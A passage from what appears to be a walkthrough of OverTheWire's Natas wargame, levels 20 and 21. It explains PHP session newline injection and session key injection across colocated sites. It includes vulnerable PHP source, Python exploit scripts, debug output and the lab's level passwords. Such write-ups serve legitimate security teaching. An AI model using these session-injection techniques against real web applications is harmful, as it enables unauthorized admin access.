    file_put_contents($filename, $data);
    chmod($filename, 0600);
} 
```

1. converts the serialized data to a dictionary

2. Sets the file permissions to [`0600`](https://chmodcommand.com/chmod-0600/). `600` in octal when converted to binary gives `110 000 000` with each triplet of the form `(read, write, execute)` and the triplets in the order `(owner, group, others)`. Thus, only the owner may read and write to this file.

A few tests reveal some extra facts:

1. At the beginning of the session, a PHPSESSID is alloted. A file name is created and contents of the form are written to the form.

2. There is no escaping and parsing to the user data in the form.

3. Reading from the file is of the form `READ [name admin]` implying file stores contents separated by a space.

The exploit-

```python
def exploit():

    sess = requests.Session()

    auth_username = 'natas20'
    auth_password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF' 
    _payload = {'name' : 'admin\nadmin 1'}
    response = sess.post('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    dissect_response(response) 

    response = sess.get('http://natas20.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) 
```

This causes a new line to be written to the file. The second `GET` causes the `myread` function to read from this file and store in the `SESSION` variable the key-value pairs. Hence we get `admin => 1` and thus the password. 


Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

# Level 21

## PHP session hijacking in colocated websites

URL: http://natas21.natas.labs.overthewire.org

This is collocated with http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug.

Contents of original website

```php
<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?> 
```

Nothing much to work with except the `admin = 1` stuff.

The source of the second website is:

```php
session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?> 
```

The following workflow:

1. Form is embedded in PHP this time. 

2. Form has one input `name=submit, value=Update`. When this happens, the `$_REQUEST` parameters are taken and stored in the session as key-value pairs.

3. Some testing and code reading shows other code isn't of much interest.

We need to inject a new key-value pair `admin=1` into the session, and then colocate to `http://natas21.natas.labs.overthewire.org` with the same session.

```python
def exploit():

    sess = requests.Session()

    auth_username = 'natas21'
    auth_password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ' 
    _payload = {'align' : 'left', 'fontsize': '100%', 'bgcolor' : 'red', 'admin':'1', 'submit':'Update'}
    
    response = sess.get('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response) 
    
    response = sess.post('http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password), data=_payload)
    # dissect_response(response) 

    for cookie in sess.cookies:
        val = cookie.value

    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response) 

    for cookie in sess.cookies:
        if(cookie.domain == "natas21.natas.labs.overthewire.org"):
            cookie.value = val

    response = sess.get('http://natas21.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth(auth_username, auth_password))
    dissect_response(response) 
```

The `_payload` has several things, note `"submit": "Update"` is the key. If it is not so, the session value doesn't change. To note this, simply perform `POST` to `...?debug` and observe the session values being printed. Omitting the above key-value pair prints defaults, including them prints dictionary of your choice.

In the above exploit, the first `POST` gives up a `PHPSESSID` in form of a cookie. The session contents are also modified and displayed if `POST` to `...?debug` was made.

```s
[DEBUG] Session contents:<br>Array
(
    [align] => left
    [fontsize] => 100%
    [bgcolor] => red
    [debug] => 
    [admin] => 1
    [submit] => Update
)
```

Now we perform a `GET` to the main URL, get a new `PHPSESSID` (as is the case when a new session starts), replace that with the `PHPSESSID` of experimenter, and then perform a `GET` again. There's the password.

#### Why are we able to include a new key value pair (admin => 1)?

Because of the way `$_REQUEST` values are written into the session.

```php
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
} 
```

The foreach loop reads everything into the session. The invalid keys are discarded later on in- 

```php
// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
} 
```

but the values are already included in the session by then. Thus, the exploit works. 

Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ